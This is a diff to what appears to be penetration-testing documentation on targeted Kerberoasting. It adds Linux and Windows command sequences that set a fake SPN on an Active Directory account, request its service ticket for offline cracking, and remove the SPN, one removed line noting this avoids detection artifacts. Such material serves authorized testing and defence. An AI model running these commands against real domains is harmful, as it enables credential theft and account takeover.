@@ -101,28 +101,51 @@ hashcat -m 19700 hashes.txt ~/tools/wordlists/rockyou
 
 If you have `GenericWrite` on a user account, you can set an SPN on it, request the TGS, then clean up. Useful for accounts that don't normally have SPNs.
 
-<Steps>
-  <Step title="Set a fake SPN on the target account">
-    ```powershell wrap
-    Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
+<Tabs>
+  <Tab title="Linux">
+    <Steps>
+      <Step title="Set a fake SPN on the target account">
+        ```bash wrap
+        bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+          set object $TARGET servicePrincipalName -v "fake/spn.$DOMAIN"
+        ```
+      </Step>
+      <Step title="Request the TGS">
+        ```bash wrap
+        GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET -outputfile targeted.txt
+        ```
+      </Step>
+      <Step title="Clean up">
+        ```bash wrap
+        bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+          set object $TARGET servicePrincipalName -v ''
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+  <Tab title="Windows">
+    <Steps>
+      <Step title="Set a fake SPN on the target account">
+        ```powershell wrap
+        Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
 
-    # Verify it was set
-    Get-DomainUser $TARGET | Select-Object serviceprincipalname
-    ```
-  </Step>
-  <Step title="Request the TGS">
-    ```bash wrap
-    GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET -outputfile targeted.txt
-    ```
-  </Step>
-  <Step title="Clean up">
-    Remove the fake SPN to avoid leaving detection artifacts.
-
-    ```powershell wrap
-    Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
-    ```
-  </Step>
-</Steps>
+        # Verify it was set
+        Get-DomainUser $TARGET | Select-Object serviceprincipalname
+        ```
+      </Step>
+      <Step title="Request the TGS">
+        ```powershell wrap
+        Rubeus.exe kerberoast /user:$TARGET /outfile:targeted.txt
+        ```
+      </Step>
+      <Step title="Clean up">
+        ```powershell wrap
+        Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
 
 ## Clock Skew (faketime)
 
